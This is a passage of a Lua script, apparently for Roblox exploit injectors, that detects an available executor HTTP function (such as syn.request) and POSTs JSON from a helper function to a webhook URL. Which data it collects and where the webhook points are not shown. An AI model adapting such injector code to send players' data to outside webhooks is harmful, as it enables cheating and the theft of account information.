            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request -- Compatibilidad con m√∫ltiples inyectores

    if request then
        local success, result = pcall(function()
            return request({
                Url = webhookUrl,
                Body = data,
                Method = "POST",
                Headers = headers
            })
        end)

        if success then
            notify("Success", "Webhook enviado correctamente.")
        else
            notify("Error", "No se pudo enviar el webhook: " .. tostring(result))
        end
    else
        notify("Error", "El inyector no soporta solicitudes HTTP.")
    end
end

local webhookData = createWebhookData()
sendWebhook(webhookData)


